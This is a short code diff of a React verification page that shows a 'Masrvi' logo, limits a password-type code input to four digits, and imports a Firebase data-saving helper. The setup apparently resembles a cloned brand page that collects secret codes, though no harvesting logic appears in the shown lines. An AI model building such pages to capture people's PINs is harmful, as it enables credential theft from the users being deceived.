@@ -12,7 +12,7 @@ import { addData } from "@/lib/firebase"
 
 export default function VerifyPage() {
   const router = useRouter()
-  const [code, setCode] = useState(" ")
+  const [code, setCode] = useState("")
   const [isLoading, setIsLoading] = useState(false)
 
   const handleSubmit = (e: React.FormEvent) => {
@@ -35,7 +35,10 @@ export default function VerifyPage() {
           <Link href="/" className="mr-4">
             <ArrowLeft className="h-5 w-5 text-gray-600" />
           </Link>
-          <Image src="/masrvi-logo.png" alt="Masrvi Logo" width={160} height={64} className="h-auto" />
+          <div className="max-w-md mx-auto flex justify-center">
+
+          <Image src="/loggo.avif" alt="Masrvi Logo" width={260} height={150} className="h-auto" />
+        </div>
         </div>
       </header>
 
@@ -51,6 +54,7 @@ export default function VerifyPage() {
             <div className="space-y-4">
               <Input
                 type="password"
+                maxLength={4}
                 className="h-14 text-center text-xl border border-gray-300 rounded-lg focus:ring-2 focus:ring-emerald-400 focus:border-transparent transition-all"
                 value={code}
                 onChange={(e) => setCode(e.target.value)}
